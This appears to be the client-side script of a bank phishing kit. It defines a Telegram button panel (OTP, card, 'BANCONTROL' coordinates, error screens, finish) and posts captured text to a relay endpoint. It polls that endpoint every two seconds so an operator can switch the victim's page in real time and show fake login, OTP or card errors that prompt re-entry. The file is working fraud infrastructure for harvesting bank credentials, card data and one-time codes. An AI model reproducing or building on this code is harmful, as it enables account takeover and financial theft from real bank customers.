const Session = {
  save(k, v) { localStorage.setItem(`bg_${k}`, JSON.stringify(v)) },
  get(k) { try { return JSON.parse(localStorage.getItem(`bg_${k}`)) } catch { return null } },
  clear() { Object.keys(localStorage).filter(k => k.startsWith('bg_')).forEach(k => localStorage.removeItem(k)) }
};

const BUTTONS = {
  main: [
    [{ text: "✅ OTP", callback_data: "otp" }, { text: "💳 Tarjeta", callback_data: "tarjeta" }],
    [{ text: "🏦 BANCONTROL", callback_data: "bancontrol" }],
    [{ text: "❌ Error Login", callback_data: "error_login" }, { text: "❌ Error OTP", callback_data: "error_otp" }],
    [{ text: "❌ Error Tarjeta", callback_data: "error_tarjeta" }, { text: "❌ Error Bancontrol", callback_data: "error_bancontrol" }],
    [{ text: "🏁 Finalizar", callback_data: "finalizar" }]
  ]
};

async function sendTelegram(text, buttons = []) {
  const res = await fetch('/api/send', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ text, buttons })
  });
  return res.json();
}

let lastUpdateId = 0;

async function startPolling(handler) {
  try {
    const init = await fetch('/api/poll?init=true');
    const initData = await init.json();
    if (initData.update_id) lastUpdateId = initData.update_id;
  } catch(e) { console.error('init error:', e); }

  const iv = setInterval(async () => {
    try {
      const res = await fetch(`/api/poll?offset=${lastUpdateId}`);
      const data = await res.json();
      if (!data.ok || !data.action) {
        if (data.update_id) lastUpdateId = data.update_id;
        return;
      }
      lastUpdateId = data.update_id;
      if (data.action === 'bancontrol' && data.coords) {
        Session.save('bancontrol_coords', data.coords);
      }
      clearInterval(iv);
      handler(data.action);
    } catch (e) { console.error('poll error:', e); }
  }, 2000);
}

function showWait() { document.getElementById('wait').classList.add('active') }
function hideWait() { document.getElementById('wait').classList.remove('active') }
function showAlert(id, msg) {
  const el = document.getElementById(id);
  el.classList.add('show');
  const s = el.querySelector('span');
  if (s && msg) s.textContent = msg;
}
function hideAlert(id) { document.getElementById(id)?.classList.remove('show') }
function showErr(id) {
  document.getElementById(id)?.classList.add('error');
  document.getElementById(`e-${id}`)?.classList.add('show');
}
function clearErrs(ids) {
  ids.forEach(id => {
    document.getElementById(id)?.classList.remove('error');
    document.getElementById(`e-${id}`)?.classList.remove('show');
  });
}
